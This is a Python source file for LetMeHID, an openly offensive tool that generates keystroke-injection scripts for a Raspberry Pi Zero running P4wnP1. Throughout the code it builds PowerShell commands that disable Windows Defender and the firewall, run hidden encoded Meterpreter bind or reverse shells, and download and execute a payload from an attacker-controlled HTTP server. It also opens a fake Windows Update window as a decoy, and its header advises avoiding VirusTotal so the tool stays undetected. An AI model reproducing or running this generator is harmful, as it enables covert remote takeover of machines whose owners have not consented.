#!/usr/bin/env python3

"""
LetMeHID.py 0.1 - Meterpreter HID payload generator
Copyright (c) 2020 Federico Dotta

LetMeHID is a tool that generates Windows HID payloads to obtain bind or reverse access using Raspberry PI0 and P4wnP1 A.L.O.A.

It implements various techniques to deliver and execute the payload (direct on keyboard, download and execute, using PI0 external
device) and it has a low detection rate from Antivirus softwares (avoiding uploading to VirusTotal could help keep it in that way...)

Get the latest version at:
https://github.com/federicodotta
"""

import argparse
from base64 import b64encode
import sys

parser = argparse.ArgumentParser(description="A little tool to generate Meterpreter HID attack vectors for P4wnP1 A.L.O.A.",formatter_class=argparse.ArgumentDefaultsHelpFormatter)

required_args = parser.add_argument_group('required arguments')
required_args.add_argument("--layout", required=True, help="Target keyboard layout")

general_args = parser.add_argument_group('general arguments')
general_args.add_argument("--attack", choices=['direct','downloadAndExecute','executeFromSd'], default="direct", help="Type directly, download payload or execute from a external drive/CD rom supplied by the PI0")
general_args.add_argument("--delay", default="500", help="Fixed time in millisecondsbetween instructions")
general_args.add_argument("--start", choices=['now','waitLED','waitLEDRepeat','fixedTime'],default="waitLED",help="When the payload should start")
general_args.add_argument("--fixedTime", type=int, default=10000, help="Fixed time (milliseconds) before starting the payload (--start fixedTime only)")
general_args.add_argument("--output", choices=['console','output_file'],default="console",help="Output channel for the HID payload")
general_args.add_argument("--outputFile", default="generatedHIDpayload.txt", help="Path of the HID payload in output")
general_args.add_argument("--fakeLegitProcess", required='--fakeLegitProcessCommand' in sys.argv, help="Run a command in order to fake a legit process (for example a command that open an update window)", action="store_true")
general_args.add_argument("--fakeLegitProcessCommand", default="control.exe /name Microsoft.WindowsUpdate", help="Command to execute in order to fake a legit process (default Windows Update page of Control Panel)")

admin_args = parser.add_argument_group('admin arguments')
admin_args.add_argument("--admin", help="Admin mode (slower)", required='--disableDefender' in sys.argv or '--disableFirewall' in sys.argv , action="store_true")
admin_args.add_argument("--disableDefender", help="Try to disable defender (admin mode only)", action="store_true")
admin_args.add_argument("--disableFirewall", help="Try to disable firewall (admin mode only)", action="store_true")

met_args = parser.add_argument_group('meterpreter arguments')
met_args.add_argument("--type", choices=['bind','reverse'], default="bind", help="Type of meterpreter shell")
met_args.add_argument("--port", default="4444", help="Port of the bind/reverse shell")
met_args.add_argument("--ipRevListener", required='reverse' in sys.argv, help="IP address of the reverse listener (reverse only)")

download_args = parser.add_argument_group('downloadAndExecute attack arguments')
download_args.add_argument("--generatePayload", help="Generate payload in file ./enc_pay.txt", action="store_true")
download_args.add_argument("--httpServerProtocol", default="http", help="IP address of the HTTP server serving the meterpreter payload (downloadAndExecute attack only)")
download_args.add_argument("--httpServerAddress", required='downloadAndExecute' in sys.argv, help="IP address of the HTTP server serving the meterpreter payload (downloadAndExecute attack only)")
download_args.add_argument("--httpServerPort", required='downloadAndExecute' in sys.argv, help="Port of the HTTP server serving the meterpreter payload (downloadAndExecute attack only)")
download_args.add_argument("--httpServerPath", default="/enc_pay.txt", help="HTTP path of the file (downloadAndExecute attack only)")
download_args.add_argument("--useSystemProxyForDownload", help="Use system proxy for download", action="store_true")

copy_args = parser.add_argument_group('executeFromSd attack arguments')
copy_args.add_argument("--driveName", required='executeFromSd' in sys.argv, help="Drive name of PI0")
copy_args.add_argument("--fileName", default="enc_pay.txt", help="Filename of payload")

args = parser.parse_args()

delay = args.delay
bind_shell_file = "bindLetMeInForGenerator.txt"
reverse_shell_file = "reverseLetMeInForGenerator.txt"
output_filename = "enc_pay.txt"

HID_payload = ""

HID_payload += "layout('%s');\n" % args.layout

HID_payload += "typingSpeed(0,0);\n"

# Start (now, waitLED, waitLEDRepeat, fixed delay)
if args.start == "waitLED":
    HID_payload += "waitLED(ANY);\n"
elif args.start == "waitLEDRepeat":
    HID_payload += "waitLEDRepeat(ANY);\n"
elif args.start == "fixedTime":	
    HID_payload += "delay(%d);\n" % args.fixedTime

# admin?
if args.admin:
    HID_payload += "press(\"GUI r\");\n"
    HID_payload += "delay(%s);\n" % delay
    HID_payload += "type(\"powershell\");\n"
    HID_payload += "delay(%s);\n" % delay
    HID_payload += "press(\"CTRL SHIFT ENTER\");\n"
    HID_payload += "delay(5000);\n"
    HID_payload += "press(\"LEFT\");\n"
    HID_payload += "delay(%s);\n" % delay
    HID_payload += "press(\"ENTER\");\n"
    HID_payload += "delay(%s);\n" % delay
else:
    HID_payload += "press(\"GUI r\");\n"
    HID_payload += "delay(%s);\n" % delay
    HID_payload += "type(\"powershell\\n\");\n"
    HID_payload += "delay(%s);\n" % delay
    
# Disable Defender (admin only)
if args.disableDefender:
    HID_payload += 'type("Set-MpPreference -DisableRealtimeMonitoring $true");\n'
    HID_payload += "delay(%s);\n" % delay
    HID_payload += "press(\"ENTER\");\n"
    HID_payload += "delay(%s);\n" % delay

# Disable Windows Firewall (admin only)
if args.disableFirewall:
    HID_payload += 'type("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");\n'
    HID_payload += "delay(%s);\n" % delay
    HID_payload += "press(\"ENTER\");\n"
    HID_payload += "delay(%s);\n" % delay   

# Direct attack (payload pasted in powershell shell)	
if args.attack == 'direct':     

    shell_file = bind_shell_file if args.type == 'bind' else reverse_shell_file
    with open(shell_file, 'r') as file:
        shell = file.read()
    shell = shell.replace("YYYYYYYY",args.port)
    if args.type == 'reverse':
        shell = shell.replace("XXXXXXXX",args.ipRevListener)
    encoded_shell = b64encode(shell.encode('UTF-16LE'))

    if args.fakeLegitProcess:
        HID_payload += 'type("%s;powershell.exe -windowstyle hidden -encodedCommand \\"%s\\"");\n' % (args.fakeLegitProcessCommand,encoded_shell.decode("utf-8"))
    else:
        HID_payload += 'type("powershell.exe -windowstyle hidden -encodedCommand \\"%s\\"");\n' % encoded_shell.decode("utf-8")

    HID_payload += "delay(%s);\n" % delay
    HID_payload += "press(\"ENTER\");\n"
    HID_payload += "delay(%s);\n" % delay

# Payload downloaded from attacker and executed
elif args.attack == 'downloadAndExecute':

    # Only for PowerShell >= 3
    # type("powershell.exe -ExecutionPolicy ByPass -command \"Invoke-WebRequest -Uri 'http://A.B.C.D:8888/out_enc.txt' -OutFile 'C:\windows\Temp\temp123.txt'\"");

    # Download
    if args.useSystemProxyForDownload:
        download_command = "$b = New-Object System.Net.WebClient;$b.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;$c = $b.DownloadData(\"%s://%s:%s%s\");$d = [System.Text.Encoding]::UTF8.GetString($c);powershell.exe -encodedCommand $d" % (args.httpServerProtocol,args.httpServerAddress,args.httpServerPort,args.httpServerPath)
    else:
        download_command = "$b = New-Object System.Net.WebClient;$b.Proxy = $null;$c = $b.DownloadData(\"%s://%s:%s%s\");$d = [System.Text.Encoding]::UTF8.GetString($c);powershell.exe -windowstyle hidden -encodedCommand $d" % (args.httpServerProtocol,args.httpServerAddress,args.httpServerPort,args.httpServerPath)
        
    encoded_download_command = b64encode(download_command.encode('UTF-16LE'))
    
    if args.fakeLegitProcess:
        HID_payload += 'type("%s;powershell.exe -windowstyle hidden -encodedCommand \\"%s\\";");\n' % (args.fakeLegitProcessCommand,encoded_download_command.decode("utf-8"))
    else:
        HID_payload += 'type("powershell.exe -windowstyle hidden -encodedCommand \\"%s\\";");\n' % encoded_download_command.decode("utf-8")

    HID_payload += "delay(%s);\n" % delay
    HID_payload += "press(\"ENTER\");\n"
    HID_payload += "delay(%s);\n" % delay

# Payload executed from PI0 external drive (SD or CD rom)
else:

    # Get SD/CD rom letter using label and execute payload inside the PI0 SD/CD rom   
    if args.fakeLegitProcess:
        HID_payload += 'type("%s;$l = ((gwmi win32_volume -f \\"label=\\"\\"%s\\"\\"\\").Name); powershell.exe -windowstyle hidden -encodedCommand ([IO.File]::ReadAllText(\\"$($l)\\%s\\"))");\n' % (args.fakeLegitProcessCommand,args.driveName,args.fileName)
    else:
        HID_payload += 'type("$l = ((gwmi win32_volume -f \\"label=\\"\\"%s\\"\\"\\").Name); powershell.exe -windowstyle hidden -encodedCommand ([IO.File]::ReadAllText(\\"$($l)\\%s\\"))");\n' % (args.driveName,args.fileName)
    
    HID_payload += "delay(%s);\n" % delay
    HID_payload += "press(\"ENTER\");\n"
    HID_payload += "delay(%s);\n" % delay


# Generate payload to file (for downloadAndExecute and executeFromSd)
if (args.attack == 'downloadAndExecute' or args.attack == 'executeFromSd') and args.generatePayload:
    shell_file = bind_shell_file if args.type == 'bind' else reverse_shell_file
    with open(shell_file, 'r') as file:
        shell = file.read()
    shell = shell.replace("YYYYYYYY",args.port)
    if args.type == 'reverse':
        shell = shell.replace("XXXXXXXX",args.ipRevListener)
    encoded_shell = b64encode(shell.encode('UTF-16LE'))
    with open(output_filename, 'wb') as the_file:
        the_file.write(encoded_shell)

# Output
if args.output == "console" and (args.attack == "downloadAndExecute" or args.attack == 'executeFromSd'):
    sys.stderr.write("**** DO NOT PASTE THIS AS PART OF THE HID PAYLOAD *****\n")

if args.generatePayload:
    sys.stderr.write("Meterpreter payload generated to %s\n" % output_filename)

if args.attack == "downloadAndExecute":
    sys.stderr.write("Copy meterpreter payload to %s://%s:%s%s before using the HID payload!!!\n" % (args.httpServerProtocol,args.httpServerAddress,args.httpServerPort,args.httpServerPath))
elif args.attack == "executeFromSd":
    sys.stderr.write("Copy meterpreter payload to PI0 drive named %s in %s file before using the HID payload!!!\n" % (args.driveName,args.fileName))

if args.output == "console" and (args.attack == "downloadAndExecute" or args.attack == 'executeFromSd'):
    sys.stderr.write("*******************************************************\n")

if args.output == "console":
    print(HID_payload)
else:
    with open(args.outputFile, "w") as out_file:
        out_file.write(HID_payload)
    print("HID payload saved in file %s\n" % args.outputFile)
